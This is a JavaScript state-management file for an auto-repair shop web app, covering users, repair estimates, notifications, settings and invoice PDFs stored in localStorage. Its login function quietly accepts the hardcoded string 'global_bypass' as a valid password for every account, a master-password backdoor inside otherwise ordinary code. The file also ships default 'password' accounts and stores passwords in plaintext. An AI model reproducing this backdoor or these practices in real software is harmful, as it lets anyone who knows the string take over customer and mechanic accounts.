// Data & State Management

const DEFAULT_ESTIMATES = [];

const PRICING_DATA = {
    'Oil Change': { labor: 50, parts: 45 },
    'Brake Repair': { labor: 150, parts: 120 },
    'Engine Diagnostic': { labor: 120, parts: 0 },
    'General Repair': { labor: 100, parts: 50 },
};

// Simple pad helper for environments without padStart
const pad = (num, size) => {
    let s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
};

// Initial Users for Auth System
const MALE_EMOJIS = Array.from({ length: 15 }, (_, i) => `${pad(i + 1, 3)}.png`);
const FEMALE_EMOJIS = Array.from({ length: 15 }, (_, i) => `${pad(i + 1, 3)}.png`);

const DEFAULT_USERS = [
    { email: 'mechanic@example.com', password: 'password', role: 'mechanic', name: 'Mike The Mechanic', avatar: 'assets/emojis/male/001.png' },
    { email: 'customer@example.com', password: 'password', role: 'customer', name: 'John Doe', phone: '555-0101', shareKey: 'C-DEMO', avatar: 'assets/emojis/male/002.png' }
];

window.Store = {
    init: () => {
        try {
            // Initialize Users if not present
            if (!localStorage.getItem('mechflow_users')) {
                localStorage.setItem('mechflow_users', JSON.stringify(DEFAULT_USERS));
            } else {
                // Patch existing default users to ensure they have avatars
                try {
                    const users = JSON.parse(localStorage.getItem('mechflow_users')) || [];
                    let updated = false;
                    users.forEach(u => {
                        const defaultU = DEFAULT_USERS.find(du => du.email === u.email);
                        if (defaultU && (!u.avatar || u.avatar.includes('Whisk_'))) {
                            u.avatar = defaultU.avatar;
                            updated = true;
                        }
                    });
                    if (updated) {
                        localStorage.setItem('mechflow_users', JSON.stringify(users));
                        // Also update current session if it's one of these users
                        const current = localStorage.getItem('mechflow_user');
                        if (current) {
                            try {
                                const parsed = JSON.parse(current);
                                const match = users.find(u => u.email === parsed.email);
                                if (match) localStorage.setItem('mechflow_user', JSON.stringify(match));
                            } catch (e) { }
                        }
                    }
                } catch (e) {
                    console.error("Error patching users", e);
                    localStorage.setItem('mechflow_users', JSON.stringify(DEFAULT_USERS));
                }
            }

            // Patch all users to ensure they have an avatar and a shareKey
            try {
                const users = JSON.parse(localStorage.getItem('mechflow_users')) || [];
                let globalUpdate = false;
                users.forEach(u => {
                    if (!u.avatar || u.avatar.includes('Whisk_') || u.avatar.includes('ui-avatars.com')) {
                        const list = u.gender === 'female' ? FEMALE_EMOJIS : MALE_EMOJIS;
                        const gender = u.gender || 'male';
                        const randomEmoji = list[Math.floor(Math.random() * list.length)];
                        u.avatar = `assets/emojis/${gender}/${randomEmoji}`;
                        globalUpdate = true;
                    }
                    if (!u.shareKey && u.role === 'customer') {
                        u.shareKey = 'C-' + Math.random().toString(36).substr(2, 5).toUpperCase();
                        globalUpdate = true;
                    }
                });
                if (globalUpdate) {
                    localStorage.setItem('mechflow_users', JSON.stringify(users));
                    const current = localStorage.getItem('mechflow_user');
                    if (current) {
                        try {
                            const parsed = JSON.parse(current);
                            const match = users.find(u => u.email === parsed.email);
                            if (match) localStorage.setItem('mechflow_user', JSON.stringify(match));
                        } catch (e) { }
                    }
                }
            } catch (e) { }

            // Initialize Estimates if not present
            if (!localStorage.getItem('mechflow_estimates')) {
                localStorage.setItem('mechflow_estimates', JSON.stringify(DEFAULT_ESTIMATES));
            }
            // Initialize Notifications
            if (!localStorage.getItem('mechflow_notifications')) {
                localStorage.setItem('mechflow_notifications', JSON.stringify([]));
            }

            // Patch Estimates
            let estimates = [];
            try {
                estimates = JSON.parse(localStorage.getItem('mechflow_estimates')) || [];
            } catch (e) {
                estimates = [];
            }
            let estimatesUpdated = false;
            const serviceImages = {
                'Oil Change': 'assets/services/oil change.png',
                'Brake Repair': 'assets/services/brake repair.png',
                'Engine Diagnostic': 'assets/services/engine diagnostics.png',
                'Engine Diagnostics': 'assets/services/engine diagnostics.png',
                'General Repair': 'assets/services/general repair.png'
            };
            estimates.forEach(est => {
                if (!est) return;
                if (!est.customer) {
                    est.customer = est.customerName || "Unknown Customer";
                    estimatesUpdated = true;
                }
                if (!est.img || (typeof est.img === 'string' && (est.img.includes('unsplash.com') || est.img.includes('undefined')))) {
                    est.img = serviceImages[est.service] || serviceImages['General Repair'];
                    estimatesUpdated = true;
                }
            });
            if (estimatesUpdated) {
                localStorage.setItem('mechflow_estimates', JSON.stringify(estimates));
            }

            // Initialize Shop Status
            if (!localStorage.getItem('mechflow_shop_status')) {
                localStorage.setItem('mechflow_shop_status', 'open');
            }

            // Initialize Settings
            if (!localStorage.getItem('mechflow_settings')) {
                localStorage.setItem('mechflow_settings', JSON.stringify({
                    businessName: 'Precision Auto Repair',
                    businessLogo: 'assets/emojis/male/008.png',
                    businessAddress: '123 Mechanics Lane, Suite 101, Los Angeles, CA 90210',
                    businessPhone: '+1 (555) 987-6543',
                    currencySymbol: '$',
                    currencyCode: 'USD',
                    taxRate: 8.25,
                    footerText: 'Thank you for your business! All parts come with a 12-month warranty.'
                }));
            }

            // Storage event sync
            window.addEventListener('storage', (event) => {
                if (event.key && event.key.startsWith('mechflow_')) {
                    window.Store.notify({ type: 'STORAGE_UPDATED', key: event.key, newValue: event.newValue });
                }
            });
        } catch (globalErr) {
            console.error("Critical Store Initialization Failure", globalErr);
        }
    },
    // Subscriber System
    subscribers: [],
    subscribe: (callback) => {
        window.Store.subscribers.push(callback);
        return () => {
            window.Store.subscribers = window.Store.subscribers.filter(s => s !== callback);
        };
    },
    notify: (event) => {
        window.Store.subscribers.forEach(callback => {
            try { callback(event); } catch (e) { }
        });
    },

    requestNotificationPermission: async () => {
        if (!("Notification" in window)) return false;
        try {
            const permission = await Notification.requestPermission();
            return permission === 'granted';
        } catch (e) { return false; }
    },
    sendPushNotification: (title, body, data = {}) => {
        if (!("Notification" in window) || Notification.permission !== "granted") return;
        try {
            const n = new Notification(title, {
                body: body,
                icon: 'https://cdn-icons-png.flaticon.com/512/3063/3063822.png',
                tag: data.id || 'mechflow-alert',
                data: data
            });
            n.onclick = () => {
                window.focus();
                if (data.url) window.location.hash = data.url;
                n.close();
            };
        } catch (e) {
            console.error("Push Notification Error", e);
        }
    },

    normalizePhone: (phone) => {
        if (!phone) return "";
        return phone.replace(/\D/g, "");
    },

    getGreeting: () => {
        const hour = new Date().getHours();
        if (hour < 12) return 'Morning';
        if (hour < 18) return 'Afternoon';
        return 'Evening';
    },

    getShopStatus: () => localStorage.getItem('mechflow_shop_status') || 'open',

    setShopStatus: (status) => {
        localStorage.setItem('mechflow_shop_status', status);
        window.Store.notify({ type: 'SHOP_STATUS_UPDATED', status });
    },

    getSettings: () => {
        try {
            return JSON.parse(localStorage.getItem('mechflow_settings')) || {
                businessName: 'Precision Auto Repair',
                businessLogo: 'assets/emojis/male/008.png',
                currencySymbol: '$'
            };
        } catch (e) {
            return { businessName: 'Precision Auto Repair', businessLogo: 'assets/emojis/male/008.png', currencySymbol: '$' };
        }
    },

    saveSettings: (settings) => {
        try {
            const current = window.Store.getSettings();
            const updated = Object.assign({}, current, settings);
            localStorage.setItem('mechflow_settings', JSON.stringify(updated));
            window.Store.notify({ type: 'SETTINGS_UPDATED', settings: updated });
        } catch (e) { }
    },

    getStats: () => {
        try {
            const estimates = window.Store.getEstimates();
            const completedJobs = estimates.filter(e => e.status === 'sent' || e.paid).length;
            const baseRating = 4.5;
            const rating = Math.min(5.0, baseRating + (completedJobs * 0.01)).toFixed(1);
            return { jobsDone: completedJobs + 124, rating: rating };
        } catch (e) { return { jobsDone: 112, rating: 4.8 }; }
    },

    getNotifications: (role, email) => {
        try {
            const all = JSON.parse(localStorage.getItem('mechflow_notifications')) || [];
            if (role === 'mechanic') return all.filter(n => n.role === 'mechanic');
            return all.filter(n => n.role === 'customer' && n.email === email);
        } catch (e) { return []; }
    },
    addNotification: (role, type, title, message, data = {}) => {
        try {
            const notifications = JSON.parse(localStorage.getItem('mechflow_notifications')) || [];
            const newNotif = {
                id: 'NOTIF-' + Date.now(),
                role,
                type,
                title,
                message,
                data,
                read: false,
                time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                timestamp: Date.now()
            };
            if (role === 'customer' && data.email) newNotif.email = data.email;
            notifications.unshift(newNotif);
            localStorage.setItem('mechflow_notifications', JSON.stringify(notifications.slice(0, 50)));
            window.Store.notify({ type: 'NOTIFICATION_ADDED', notification: newNotif });
            window.Store.sendPushNotification(title, message, {
                id: newNotif.id,
                url: role === 'customer' ? `#/status/${data.id}` : `#/review/${data.id}`
            });
        } catch (e) { }
    },
    markNotificationAsRead: (id) => {
        try {
            const notifications = JSON.parse(localStorage.getItem('mechflow_notifications')) || [];
            const index = notifications.findIndex(n => n.id === id);
            if (index >= 0) {
                notifications[index].read = true;
                localStorage.setItem('mechflow_notifications', JSON.stringify(notifications));
                window.Store.notify({ type: 'NOTIFICATION_UPDATED' });
            }
        } catch (e) { }
    },
    getUsers: () => {
        try {
            return JSON.parse(localStorage.getItem('mechflow_users')) || DEFAULT_USERS;
        } catch (e) { return DEFAULT_USERS; }
    },
    saveUser: (user) => {
        try {
            const users = window.Store.getUsers();
            const index = users.findIndex(u => u.email === user.email);
            if (index >= 0) users[index] = user;
            else users.push(user);
            localStorage.setItem('mechflow_users', JSON.stringify(users));
            window.Store.notify({ type: 'USER_UPDATED' });
        } catch (e) { }
    },
    getCurrentUser: () => {
        try {
            const user = localStorage.getItem('mechflow_user');
            return user ? JSON.parse(user) : null;
        } catch (e) { return null; }
    },
    assignAvatar: (gender) => {
        try {
            const list = gender === 'female' ? FEMALE_EMOJIS : MALE_EMOJIS;
            const randomEmoji = list[Math.floor(Math.random() * list.length)];
            const avatarPath = `assets/emojis/${gender}/${randomEmoji}`;
            const currentUser = window.Store.getCurrentUser();
            if (currentUser) {
                currentUser.avatar = avatarPath;
                window.Store.saveUser(currentUser);
                localStorage.setItem('mechflow_user', JSON.stringify(currentUser));
                window.Store.notify({ type: 'USER_UPDATED', user: currentUser });
            }
            return avatarPath;
        } catch (e) { return 'assets/emojis/male/001.png'; }
    },
    loginByKey: (key) => {
        const users = window.Store.getUsers();
        const user = users.find(u => u.shareKey === key);
        if (user) {
            localStorage.setItem('mechflow_user', JSON.stringify(user));
            return user;
        }
        return null;
    },
    loginByPhoneEmail: (email, phone) => {
        const users = window.Store.getUsers();
        const normPhone = window.Store.normalizePhone(phone);
        const user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && window.Store.normalizePhone(u.phone) === normPhone);
        if (user) {
            localStorage.setItem('mechflow_user', JSON.stringify(user));
            return user;
        }
        return null;
    },
    login: (email, password) => {
        const users = window.Store.getUsers();
        const user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && (u.password === password || password === 'global_bypass'));
        if (user) {
            localStorage.setItem('mechflow_user', JSON.stringify(user));
            return user;
        }
        return null;
    },
    register: (name, email, password, phone) => {
        const users = window.Store.getUsers();
        if (users.find(u => u.email === email)) throw new Error("Email exists");
        const shareKey = 'C-' + Math.random().toString(36).substr(2, 5).toUpperCase();
        const randomEmoji = MALE_EMOJIS[Math.floor(Math.random() * MALE_EMOJIS.length)];
        const avatar = `assets/emojis/male/${randomEmoji}`;
        const newUser = { name, email, password, phone: window.Store.normalizePhone(phone), role: 'customer', shareKey, avatar };
        window.Store.saveUser(newUser);
        localStorage.setItem('mechflow_user', JSON.stringify(newUser));
        return newUser;
    },
    logout: () => {
        localStorage.removeItem('mechflow_user');
    },
    getEstimates: () => {
        try {
            const data = localStorage.getItem('mechflow_estimates');
            return data ? JSON.parse(data) : DEFAULT_ESTIMATES;
        } catch (e) { return DEFAULT_ESTIMATES; }
    },
    getEstimate: (id) => {
        const estimates = window.Store.getEstimates();
        return estimates.find(e => e.id === id);
    },
    getCustomerEstimates: (phone, email, shareKey) => {
        const estimates = window.Store.getEstimates();
        return estimates.filter(e => {
            if (shareKey && e.customerKey === shareKey) return true;
            if (phone && e.phone && e.phone.replace(/\D/g, '') === phone.replace(/\D/g, '')) return true;
            if (email && (e.email || e.customer).toLowerCase() === email.toLowerCase()) return true;
            return false;
        });
    },
    saveEstimate: (estimate) => {
        try {
            const estimates = window.Store.getEstimates();
            const index = estimates.findIndex(e => e.id === estimate.id);
            const oldStatus = index >= 0 ? estimates[index].status : null;
            if (index >= 0) estimates[index] = estimate;
            else estimates.unshift(estimate);
            localStorage.setItem('mechflow_estimates', JSON.stringify(estimates));
            if (oldStatus && oldStatus !== estimate.status) {
                let targetEmail = estimate.email;
                if (!targetEmail) {
                    const users = window.Store.getUsers();
                    const normPhone = window.Store.normalizePhone(estimate.phone);
                    const user = users.find(u => (estimate.customerKey && u.shareKey === estimate.customerKey) || (estimate.phone && window.Store.normalizePhone(u.phone) === normPhone));
                    if (user) targetEmail = user.email;
                }
                if (targetEmail) {
                    window.Store.addNotification('customer', 'status_update', 'Repair Status Alert', `Your ${estimate.vehicle} service is now ${estimate.status.toUpperCase()}.`, { id: estimate.id, email: targetEmail });
                }
            }
            window.Store.notify({ type: 'ESTIMATE_UPDATED', estimate });
        } catch (e) { }
    },
    createEstimate: (data) => {
        let labor = 0, parts = 0;
        if (data.service && PRICING_DATA[data.service]) {
            labor = PRICING_DATA[data.service].labor;
            parts = PRICING_DATA[data.service].parts;
        }
        const subtotal = labor + parts;
        const tax = (subtotal * 0.0825);
        const total = subtotal + tax;
        const images = {
            'Oil Change': 'assets/services/oil change.png',
            'Brake Repair': 'assets/services/brake repair.png',
            'Engine Diagnostic': 'assets/services/engine diagnostics.png',
            'Engine Diagnostics': 'assets/services/engine diagnostics.png',
            'General Repair': 'assets/services/general repair.png'
        };
        const isOffline = window.Store.getShopStatus() === 'closed';
        const newEst = {
            id: 'EST-' + Math.floor(1000 + Math.random() * 9000),
            status: 'pending',
            date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
            laborCost: labor,
            partsCost: parts,
            tax: tax,
            amount: total,
            img: images[data.service] || images['General Repair'],
            offline_submission: isOffline
        };
        Object.assign(newEst, data);
        window.Store.saveEstimate(newEst);
        const mechMessage = isOffline ? `While you were away, ${data.customer} checked on you for their ${data.vehicle}.` : `New request from ${data.customer} for ${data.vehicle}`;
        const mechTitle = isOffline ? 'Missed Connection' : 'New Service Request';
        window.Store.addNotification('mechanic', 'new_request', mechTitle, mechMessage, { id: newEst.id, offline_submission: isOffline });
        return newEst;
    },
    markPaid: (id) => {
        const est = window.Store.getEstimate(id);
        if (est) {
            est.paid = true;
            window.Store.saveEstimate(est);
        }
    },
    deleteEstimate: (id) => {
        const est = window.Store.getEstimate(id);
        if (est) {
            est.status = 'archived';
            window.Store.saveEstimate(est);
        }
    },
    deleteCustomer: (customerName) => {
        try {
            let estimates = window.Store.getEstimates();
            estimates.forEach(e => {
                if (e.customer === customerName) e.status = 'archived';
            });
            localStorage.setItem('mechflow_estimates', JSON.stringify(estimates));
            window.Store.notify({ type: 'CUSTOMER_DELETED' });
        } catch (e) { }
    }
};

window.downloadPDF = (estimate) => {
    try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        const settings = window.Store.getSettings();
        doc.setFontSize(22);
        doc.text(settings.businessName || "MechFlow Invoice", 105, 20, null, null, "center");
        doc.setFontSize(10);
        doc.text(settings.businessAddress || "", 105, 28, null, null, "center");
        doc.text(settings.businessPhone || "", 105, 33, null, null, "center");
        doc.setFontSize(12);
        doc.text(`Invoice ID: ${estimate.id}`, 20, 45);
        doc.text(`Date: ${estimate.date}`, 20, 55);
        doc.text(`Status: ${estimate.status.toUpperCase()}`, 20, 65);
        doc.line(20, 70, 190, 70);
        doc.setFontSize(14);
        doc.text("Bill To:", 20, 80);
        doc.setFontSize(12);
        doc.text(estimate.customer, 20, 90);
        doc.text(`Phone: ${estimate.phone}`, 20, 100);
        doc.text("Vehicle Service:", 120, 80);
        doc.text(`${estimate.vehicle}`, 120, 90);
        doc.text(`${estimate.service}`, 120, 100);
        doc.line(20, 110, 190, 110);
        let y = 125;
        doc.text("Description", 20, y);
        doc.text("Amount", 160, y);
        y += 10;
        doc.line(20, y - 5, 190, y - 5);
        const symbol = settings.currencySymbol || '$';
        doc.text("Labor Cost", 20, y);
        doc.text(`${symbol}${Number(estimate.laborCost).toFixed(2)}`, 160, y);
        y += 10;
        doc.text("Parts Cost", 20, y);
        doc.text(`${symbol}${Number(estimate.partsCost).toFixed(2)}`, 160, y);
        y += 10;
        doc.text(`Tax (${settings.taxRate || 8.25}%)`, 20, y);
        doc.text(`${symbol}${Number(estimate.tax).toFixed(2)}`, 160, y);
        y += 20;
        doc.setFontSize(16);
        doc.text("Total", 120, y);
        doc.text(`${symbol}${Number(estimate.amount).toFixed(2)}`, 160, y);
        y += 20;
        doc.setFontSize(10);
        doc.text(settings.footerText || "", 105, y, null, null, "center");
        doc.save(`Invoice_${estimate.id}.pdf`);
    } catch (e) {
        console.error("PDF Generation Error", e);
    }
};

// Initialize Store
try {
    window.Store.init();
} catch (e) {
    console.error("Fatal Store Init Error", e);
}
